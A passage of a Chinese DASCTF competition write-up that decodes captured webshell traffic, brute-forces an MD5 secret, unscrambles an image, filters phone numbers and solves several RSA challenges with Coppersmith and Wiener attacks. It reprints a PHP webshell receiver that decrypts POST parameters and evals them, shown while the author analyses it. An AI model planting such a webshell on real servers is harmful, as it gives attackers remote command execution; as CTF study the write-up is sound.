class="line">    $cmd .= $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_POST as $k =&gt; $v)&#123;</span><br><span class="line">    if (openssl_public_decrypt(base64_decode($v), $de, $pk)) &#123;</span><br><span class="line">       $_POST[$k]=$de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure>
<p>把 eval 改成 echo，就能解密那些请求了。</p>
<p>解密后发现并没有什么东西，因为实际执行的命令在后面的参数中，而不是 ant 参数。</p>
<p>修改一下脚本，直接将其输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = @$_POST[&#x27;ant&#x27;];</span><br><span class="line">$pk = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx</span><br><span class="line">PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ</span><br><span class="line">5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J</span><br><span class="line">RAcfJSQCvaw6O8uq3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds = explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$cmd = &#x27;&#x27;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .= $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_POST as $k =&gt; $v)&#123;</span><br><span class="line">    if (openssl_public_decrypt(base64_decode($v), $de, $pk)) &#123;</span><br><span class="line">       $_POST[$k]=$de;</span><br><span class="line">       echo $de.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo($cmd);</span><br></pre></td></tr></table></figure>
<p>本地启动该服务，随便粘一个 payload 进去，可以解密出3个内容，其中”第一部分“是 base64 编码后的 /bin/zsh，”第二部分“是实际执行的命令，”第三部分“没用。</p>
<p>可以过滤 http.request.method == POST，把所有 POST 请求过滤出来。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195255669.png" alt="image-20241220195255669"></p>
<p>就拿第一个为例，我们把payload 解密后是如下内容。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195340983.png" alt="image-20241220195340983"></p>
<p>第二个内容去掉前几个字符，base64 解出来是如下内容。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195356909.png" alt="image-20241220195356909"></p>
<p>就是把 secret 文件中的 i,7 这两个字符都替换成了 x，我们可以在这条流的响应中拿到回显。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195416655.png" alt="image-20241220195416655"></p>
<p>也是去掉前几个字符，然后 base64 解码。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195448087.png" alt="image-20241220195448087"></p>
<p>框住的地方就是替换字符后的 secret 文件。</p>
<p>我们依次解密所有的 payload，发现有的 payload 解不出来”第二部分”，问题出在 php 的 openssl_public_decrypt，一次只能解 128 个字节，我们需要每次取 128 个字节，然后 base64 编码后传入解密，最后再拼接才能解出正确的内容。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195520592.png" alt="image-20241220195520592"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195532708.png" alt="image-20241220195532708"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pk = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx</span><br><span class="line">PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ</span><br><span class="line">5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J</span><br><span class="line">RAcfJSQCvaw6O8uq3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$v = &quot;SpdmQo8YK6Iag/3iNakttTCsmjdZN+VU9AakLngsk00A9jL6e5zyjPF5ePQpXrXxy2ZjSXLfS5J9t7xatfP6Rqjsl/7UQU+jrfgLE9fejXv0mOSDjZuu+4Qaw8eLX0QIbohjkI6eyTHcKBDITcEt2oe6vBG4re29lCopCaXOo+Q=&quot;;</span><br><span class="line">openssl_public_decrypt(base64_decode($v), $de, $pk);</span><br><span class="line">echo($de);</span><br></pre></td></tr></table></figure>
<p> 每一段都这样处理，最后拼起来就是正确的“第二部分”。</p>
<p>其中一条流的payload解出来是这样的内容。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195615949.png" alt="image-20241220195615949"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX18tplkP51SopY26cczUyjuT8tP9j3Ofqv5XF5njA7CygY125iYhxplSQTNoT/kcwoN1z+4a4r/+9JtONfutcHXoyCv2tLseBHr802V/RRtFaZnZc3DM/trRmjk5SAyMSgvN+laSp6uK8eAOq7yKWq7FI+En5cu+j7+bxiuceviSoJ9gEw3SfEMtz4rYbKHagq8aCAlKPEevM+HVSnGSrMoy6QS8oQPgHkafdVj2m1HmfkdQFL5q7qYvrxVlRLbm657I0VIIusf8Q6+rsvlh28HrE3MzLlu6fd/cQ7nsZKuKYo0u4pc/yvI3RZglrd7Fb6piO4ryhs2g1g==</span><br></pre></td></tr></table></figure>
<p>根据特征，应该是 AES 加密后的 flag，但是不知道密钥。</p>
<p>密钥应该是在 secret 里面，其中一条流的指令是 md5sum secret，可以知道secret 的 MD5 值，这里不做演示，解密方法和上面一样。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edffd5be04cc060e343cad479a8b845c</span><br></pre></td></tr></table></figure>
<p>直接爆破哈希。注意有的 x 字符原本就是 x。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line">key = &quot;xx34d619x1brxgd9mgd4xzxwxytv669w&quot;</span><br><span class="line">mymd5 = &quot;edffd5be04cc060e343cad479a8b845c&quot;</span><br><span class="line">box = [&#x27;i&#x27;,&#x27;7&#x27;,&#x27;x&#x27;]</span><br><span class="line">for p1 in box:</span><br><span class="line">    for p2 in box:</span><br><span class="line">        for p3 in box:</span><br><span class="line">            for p4 in box:</span><br><span class="line">                for p5 in box:</span><br><span class="line">                    for p6 in box:</span><br><span class="line">                        for p7 in box:</span><br><span class="line">                            key = p1 + p2 + &quot;34d619&quot; + p3 + &quot;1br&quot; + p4 + &quot;gd9mgd4&quot; + p5 + &quot;z&quot; + p6 + &quot;w&quot; + p7 + &quot;ytv669w&quot;</span><br><span class="line">                            temp = md5(key.encode()).hexdigest()</span><br><span class="line">                            if temp == mymd5:</span><br><span class="line">                                print(key)</span><br></pre></td></tr></table></figure>
<p>发现跑不出来，原来抽象出题人往 secret 里面最后放了一个换行符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line">key = &quot;xx34d619x1brxgd9mgd4xzxwxytv669w&quot;</span><br><span class="line">mymd5 = &quot;edffd5be04cc060e343cad479a8b845c&quot;</span><br><span class="line">box = [&#x27;i&#x27;,&#x27;7&#x27;,&#x27;x&#x27;]</span><br><span class="line">for p1 in box:</span><br><span class="line">    for p2 in box:</span><br><span class="line">        for p3 in box:</span><br><span class="line">            for p4 in box:</span><br><span class="line">                for p5 in box:</span><br><span class="line">                    for p6 in box:</span><br><span class="line">                        for p7 in box:</span><br><span class="line">                            key = p1 + p2 + &quot;34d619&quot; + p3 + &quot;1br&quot; + p4 + &quot;gd9mgd4&quot; + p5 + &quot;z&quot; + p6 + &quot;w&quot; + p7 + &quot;ytv669w\n&quot;</span><br><span class="line">                            temp = md5(key.encode()).hexdigest()</span><br><span class="line">                            if temp == mymd5:</span><br><span class="line">                                print(key)</span><br></pre></td></tr></table></figure>
<p>跑出来 secret 的内容如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i734d619i1brigd9mgd4xz7w7ytv669w</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195905630.png" alt="image-20241220195905630"></p>
<p>将 Delta 替换成 D，Alpha 替换成 A，数字的英文单词替换成数字，Dash 替换成连字符，其他依此类推，得到最终的 flag，最后还需要把大写字母换成小写的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DASCTF3FD34B59-4E9D-4390-927B-1346D5364D99</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195931603.png" alt="image-20241220195931603"></p>
<h2 id="PixMatrix"><a href="#PixMatrix" class="headerlink" title="PixMatrix"></a>PixMatrix</h2><p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195956302.png" alt="image-20241220195956302"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200029401.png" alt="image-20241220200029401"></p>
<p>放大图片仔细看，发现就是每 8<em>8 的像素中，把左下角 4</em>4 的像素和右上角 4*4 的像素交换， GPT 跑一个脚本即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 交换两个子矩阵的函数</span><br><span class="line">def swap_subblocks(block):</span><br><span class="line">    # block 是一个 8x8 的块</span><br><span class="line">    # 将左下角的 4x4 与右上角的 4x4 交换</span><br><span class="line">    left_bottom = block[4:8, 0:4]</span><br><span class="line">    right_top = block[0:4, 4:8]</span><br><span class="line"></span><br><span class="line">    # 执行交换</span><br><span class="line">    block[0:4, 4:8] = left_bottom</span><br><span class="line">    block[4:8, 0:4] = right_top</span><br><span class="line"></span><br><span class="line">    return block</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 读取图片</span><br><span class="line">def process_image(input_image_path, output_image_path):</span><br><span class="line">    # 打开图片并转换为 RGB 模式</span><br><span class="line">    img = Image.open(input_image_path)</span><br><span class="line">    img = img.convert(&quot;RGB&quot;)</span><br><span class="line"></span><br><span class="line">    # 将图片转换为 NumPy 数组</span><br><span class="line">    img_array = np.array(img)</span><br><span class="line"></span><br><span class="line">    # 获取图片的宽度和高度</span><br><span class="line">    height, width, _ = img_array.shape</span><br><span class="line"></span><br><span class="line">    # 按 8x8 的块进行遍历</span><br><span class="line">    for y in range(0, height, 8):</span><br><span class="line">        for x in range(0, width, 8):</span><br><span class="line">            # 选择当前的 8x8 块，确保它不会越界</span><br><span class="line">            block = img_array[y:y + 8, x:x + 8]</span><br><span class="line">            if block.shape[0] == 8 and block.shape[1] == 8:</span><br><span class="line">                # 交换块中的左下角和右上角</span><br><span class="line">                img_array[y:y + 8, x:x + 8] = swap_subblocks(block)</span><br><span class="line"></span><br><span class="line">    # 将处理后的图像数组转换回图片</span><br><span class="line">    processed_img = Image.fromarray(img_array)</span><br><span class="line"></span><br><span class="line">    # 保存处理后的图片</span><br><span class="line">    processed_img.save(output_image_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 输入输出图片路径</span><br><span class="line">input_image_path = &quot;PixMatrix.jpg&quot;  # 你的输入图片路径</span><br><span class="line">output_image_path = &quot;output.jpg&quot;  # 输出图片路径</span><br><span class="line"></span><br><span class="line"># 处理图片</span><br><span class="line">process_image(input_image_path, output_image_path)</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200108855.png" alt="image-20241220200108855"></p>
<h1 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h1><h2 id="ds-findphone"><a href="#ds-findphone" class="headerlink" title="ds-findphone"></a>ds-findphone</h2><p>只需要使用正则过滤合法手机号即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import csv</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 定义符合条件的手机号码前三位数字</span><br><span class="line">prefixes = [</span><br><span class="line">    &quot;734&quot;, &quot;735&quot;, &quot;736&quot;, &quot;737&quot;, &quot;738&quot;, &quot;739&quot;, &quot;747&quot;, &quot;748&quot;, &quot;750&quot;, &quot;751&quot;, &quot;752&quot;,</span><br><span class="line">    &quot;757&quot;, &quot;758&quot;, &quot;759&quot;, &quot;772&quot;, &quot;778&quot;, &quot;782&quot;, &quot;783&quot;, &quot;784&quot;, &quot;787&quot;, &quot;788&quot;, &quot;795&quot;,</span><br><span class="line">    &quot;798&quot;, &quot;730&quot;, &quot;731&quot;, &quot;732&quot;, &quot;740&quot;, &quot;745&quot;, &quot;746&quot;, &quot;755&quot;, &quot;756&quot;, &quot;766&quot;, &quot;767&quot;,</span><br><span class="line">    &quot;771&quot;, &quot;775&quot;, &quot;776&quot;, &quot;785&quot;, &quot;786&quot;, &quot;796&quot;, &quot;733&quot;, &quot;749&quot;, &quot;753&quot;, &quot;773&quot;, &quot;774&quot;,</span><br><span class="line">    &quot;777&quot;, &quot;780&quot;, &quot;781&quot;, &quot;789&quot;, &quot;790&quot;, &quot;791&quot;, &quot;793&quot;, &quot;799&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">pattern = re.compile(r&#x27;(?:&#x27; + &#x27;|&#x27;.join(prefixes) + r&#x27;)\d&#123;8&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_phone_numbers(file_path):</span><br><span class="line">    phone_numbers = []</span><br><span class="line">    with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">        for line in file:</span><br><span class="line">            matches = pattern.findall(line)</span><br><span class="line">            phone_numbers.extend(matches)</span><br><span class="line">    return phone_numbers</span><br><span class="line"></span><br><span class="line">def write_to_csv(phone_numbers, csv_file_path):</span><br><span class="line">    with open(csv_file_path, &#x27;w&#x27;, newline=&#x27;&#x27;, encoding=&#x27;utf-8&#x27;) as csv_file:</span><br><span class="line">        writer = csv.writer(csv_file)</span><br><span class="line">        writer.writerow([&#x27;category&#x27;, &#x27;value&#x27;])</span><br><span class="line">        for number in phone_numbers:</span><br><span class="line">            writer.writerow([&#x27;phone&#x27;, number])</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    file_path = &#x27;data.txt&#x27;</span><br><span class="line">    csv_file_path = &#x27;output.csv&#x27;</span><br><span class="line">    phone_numbers = find_phone_numbers(file_path)</span><br><span class="line">    write_to_csv(phone_numbers, csv_file_path)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy-crypto"></a>easy-crypto</h2><p>原题杯之Hgame，差不多的思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">n = 135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287</span><br><span class="line">leak_p = 115314121469787984258489158421056136177545051135641551928888818017665807264468</span><br><span class="line">c = 1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779</span><br><span class="line"> </span><br><span class="line">#  [2023HGAME]</span><br><span class="line"># P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"># leak_p &lt;&lt;= 8</span><br><span class="line"># for i in range(1,2**8,1):</span><br><span class="line">#     print(i)</span><br><span class="line">#     high_p = leak_p + i</span><br><span class="line">#     f = (high_p &lt;&lt; 248) + x</span><br><span class="line">#     root = f.small_roots(2 ** 248, beta = 0.4, epsilon=0.015)</span><br><span class="line">#     if root:</span><br><span class="line">#         print((high_p &lt;&lt; 248) + int(root[0]))</span><br><span class="line"># 198 这个pass掉</span><br><span class="line"># 135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271675403765521525934826819324893449423498305770961735771317949943226040011955118573198769067061551989838767670580736439906588689203692227671575331075391326630</span><br><span class="line"># 197</span><br><span class="line"># 13352463043552409670211183534740157814546713901105410408023687926498813469217507846107364405269402732967687839808637375591530105677153038557366731161035343   </span><br><span class="line">p = 13352463043552409670211183534740157814546713901105410408023687926498813469217507846107364405269402732967687839808637375591530105677153038557366731161035343</span><br><span class="line">q = n // p</span><br><span class="line">P = (p - q) &amp; ((1 &lt;&lt; 130) - 1)</span><br><span class="line">P_m_n = c % (n ** 2) - 1</span><br><span class="line">m = (P_m_n // n // P)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"># b&#x27;DASCTF&#123;365d0d2cda3a3836a19bf1f46760d875&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200313570.png" alt="image-20241220200313570"></p>
<h2 id="Mypow"><a href="#Mypow" class="headerlink" title="Mypow"></a>Mypow</h2><p>原题杯之直接搜在csdn找到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sage</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">n = 36443283250594259606482132779262570582448178589602577809591307671554949253094255209079689901493052116793388954529442162972106210862341856282788030374324677114528044629385805693771773377070021111949953333360526159026822968061585876873187059674130307295006486032106471182393880915860569773206853864515489855553</span><br><span class="line">hint = 57792516722001523643789088224096258172899052039145876393373730235406451592173971020702024058282699663364267742428240581839287357212741266617791207580236457</span><br><span class="line">ct = 24482128269957355675512496312977308128712253968496848873519792376434347925427116612997489113223781321628516365811583310346553402215907938918891908853234881284620764982626375301219763593402089309909155204943747718536894186749932544428588048770663458669109073657836937287831725958017345747881678942488157429000</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod()[]</span><br><span class="line">f = 2*x^2 + 7*n - hint*x</span><br><span class="line">p = int(f.roots()[0][0])</span><br><span class="line">q = n//p</span><br><span class="line"></span><br><span class="line">e = gmpy2.next_prime(666)-1</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x^e-ct</span><br><span class="line">f = f.monic()</span><br><span class="line">results1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x^e-ct</span><br><span class="line">f = f.monic()</span><br><span class="line">results2 = f.roots()</span><br><span class="line"></span><br><span class="line">for i in results1:</span><br><span class="line">	for j in results2:</span><br><span class="line">		param1 = [int(i[0]),int(j[0])]</span><br><span class="line">		param2 = [p,q]</span><br><span class="line">		m = CRT_list(param1,param2)</span><br><span class="line">		flag = long_to_bytes(int(m))</span><br><span class="line">		if b&#x27;DASCTF&#x27; in flag:</span><br><span class="line">			print(flag)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220200402265.png" alt="image-20241220200402265"></p>
<h2 id="ddd"><a href="#ddd" class="headerlink" title="ddd"></a>ddd</h2><p>维纳直接脚本。。。原题杯3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    &quot;&quot;&quot;计算连分数</span><br><span class="line">    :param x: 分子</span><br><span class="line">    :param y: 分母</span><br><span class="line">    :return: 连分数列表</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cf = []</span><br><span class="line">    while y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gradualFra(cf):</span><br><span class="line">    &quot;&quot;&quot;计算传入列表最后的渐进分数</span><br><span class="line">    :param cf: 连分数列表</span><br><span class="line">    :return: 该列表最后的渐近分数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in cf[::-1]:</span><br><span class="line">        # 这里的渐进分数分子分母要分开</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    &quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span><br><span class="line">    :param a:x^2的系数</span><br><span class="line">    :param b:x的系数</span><br><span class="line">    :param c:pq</span><br><span class="line">    :return:p，q</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) // (2 * a), (-b - par) // (2 * a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getGradualFra(cf):</span><br><span class="line">    &quot;&quot;&quot;计算列表所有的渐近分数</span><br><span class="line">    :param cf: 连分数列表</span><br><span class="line">    :return: 该列表所有的渐近分数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gf = []</span><br><span class="line">    for i in range(1, len(cf) + 1):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    return gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param e:</span><br><span class="line">    :param n:</span><br><span class="line">    :return: 私钥d</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    for d, k in gf:</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0:</span><br><span class="line">            continue</span><br><span class="line">        phi = (e * d - 1) // k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497</span><br><span class="line">e = 35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705</span><br><span class="line">c = 60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380</span><br><span class="line"></span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m).decode())</span><br><span class="line"></span><br><span class="line"># DASCTF&#123;e694f0b4e9556021d1bc9e8deedba575&#125;</span><br></pre></td></tr></table></figure>
<h2 id="QAQAT"><a href="#QAQAT" class="headerlink" title="QAQAT"></a>QAQAT</h2><p>原题杯4，，没看懂什么逻辑，但能出。</p>
<p><a target="_blank" rel="noopener" href="https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#step3">https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#step3</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">def enc(pt, G, A, T, S, p):</span><br><span class="line">    s = randint(0,p-1)</span><br><span class="line">    D = G^s</span><br><span class="line">    E = A*T*A</span><br><span class="line">    F = D*E*D</span><br><span class="line">    K = list(D*S*D)</span><br><span class="line">    key = sum(K[0])+sum(K[1])+sum(K[2])</span><br><span class="line">    mask = int(sha256(str(key).encode()).hexdigest(),16)</span><br><span class="line">    ct = pt ^^ mask</span><br><span class="line">    return ct, F</span><br><span class="line"></span><br><span class="line">p =  72887242108660141996862343556330151015969690949835567252527194788428065480383</span><br><span class="line">Fp2.&lt;i&gt; = GF(p^2, modulus=x^2+1)</span><br><span class="line">M = MatrixSpace(Fp2, 3, 3)</span><br><span class="line"></span><br><span class="line">p =  72887242108660141996862343556330151015969690949835567252527194788428065480383</span><br><span class="line">pk =  ([(17721183402259872020800275954210023274983052570120081248291897425608931477093*i + 32398110280895896734010284949974832063887503132353681078977206899204202173789, 54531634495057046991515273558305428867102201405617856305008554208336946545276*i + 53559176432820530464958340934397135653021175198597495321065224929188410347695, 27719945502856754481236098196014205483081586087367078493933408080194499938927*i + 1450628736387393873166171805424299538505476789523674611289973478290718453200), (57242423786686483363839647362581564383925732392730073374546590355998555747077*i + 573726326354574516128249317235875704460857319673337707555095009277545125755, 33631043256657770245013631632455702904903259491780484310654749784948198388976*i + 17344746653834202604930860577508757708688427949046279718508635007113840369042, 37771390186920740637371383242878514021347606565375600086363978842439775164973*i + 60264754185911116825495147907207494752330900415794996812483089251259003404228), (1163730453993018743008743150834548760986076138562570206571825145859591284352*i + 69245390362211526197537288211735612650619880945856387683074182933575799994162, 11137807706588795799057940108843238078078690609437386007163034291855328303661*i + 50795522649623533714787572047531722836395032085224035511036953078383612475598, 14354786571703727534706086386589187674076604263117377684131521866407943036307*i + 63028649680815097939155846824928638616844025040257105384123424769274942520895)], [(22137116252880790433838296157765927318220905592359967466680754349755815464341*i + 35503968364379821899511866562472775961434113516937033217642581531414863539290, 38346074307552448152239080224505166810289185210503265380269711384969731945517*i + 9333819647786551924409858116441570177115099865486742684028611902450000042407, 24608192510515673607042276468532809071945836783394960695059783085937608049755*i + 27099766371861599260580052331632986107092105438254563604629919595057370886149), (57539731529782952718529369617033412770127782205874818027724894673104814770991*i + 12431864123786174601413168140961685219607645783666490625760143190724674574386, 33510082449726132893492104159133966168598115972734064630878005553829725389082*i + 30594711977745700371548334707069524826346332947574826081979927125841475148328, 8911862104171403632946802970568635607253840071000107875759139060453368618583*i + 51594672749496705581452789883241278156858476777167382827032876227546058970732), (58105830161247358431125768499050987088161417325586965601350797391396603985470*i + 10949064084676782939947256128733523229613253182051362970560478801614590446300, 6665352489343222248969975791152178151760060704226637217535985452272551528693*i + 16163109497937280055564868323730465088174193174761590036929535644203224067166, 26147088265849488467397913386934580340556987670869413865359802108333761377560*i + 14170094609019059182842713618319151553137248441974849089555832123638494739417)], [(60066006389024369318961505483331049048095679333675437984483948643792214278503*i + 67617085525047580942273623886038114942547589259839196477555874755427651308048, 38692305959834079988532869421062338838072016075793686080934562521314366274998*i + 21104829450473981189549299039898127784065322316764325995863199136802573514, 7207625628360021282792621977024027446511231977201394776410095364976996279450*i + 23039079766688651678553952766794875180844089420934577132338235904018762773928), (10808368042897084491009063074724200907600038030639153659288985642861405920614*i + 33955795465220353002933680692690511153845418737513482128237117905262919879043, 21645210772494061734726430463955231707074915293749580279327741388687068110310*i + 62225984739450865202997071369617271241348810092608626482294704825641320606694, 14572118842071162051223076904993643512402905544627821044103215186921277812496*i + 63504547636870837320642724540312613748726280369811190421219651308407770510674), (6529211642735966744323364626486352288002532267939478445216264742350974653419*i + 43426895500365913698127867498420593427453574994051597107529725996420257433857, 66636149494607064863031794353485502915121295051850619450321561966293398587284*i + 51049172134567530748763269555600518661288880531459625871071308764595168859033, 